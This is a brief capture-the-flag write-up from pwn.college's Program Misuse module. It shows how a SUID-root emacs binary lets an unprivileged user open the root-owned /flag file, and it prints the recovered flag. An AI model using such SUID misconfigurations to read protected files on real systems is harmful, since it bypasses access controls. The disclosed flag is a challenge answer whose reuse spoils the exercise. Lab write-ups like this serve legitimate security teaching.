---
layout: page
title: "Challenge Name: emacs"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/emacs`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/emacs
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/emacs
```

-The `s` in `-rws` indicates it's a SUID binary.
-`emacs` runs with **root privileges**.

## 🚀 Exploitation

The `emacs` is a powerful, fully-featured text editor (and programming environment) in Linux/Unix systems. It's like Vim’s geeky, customizable cousin — often described as an operating system disguised as a text editor, so we can just use `emacs` to read the flag.

```bash
emacs /flag
```

Output:
```
pwn.college{gbXb3IurzbJrhJnbnVQWdL2TXMp.dBTNxwSM0IzMyEzW}
```

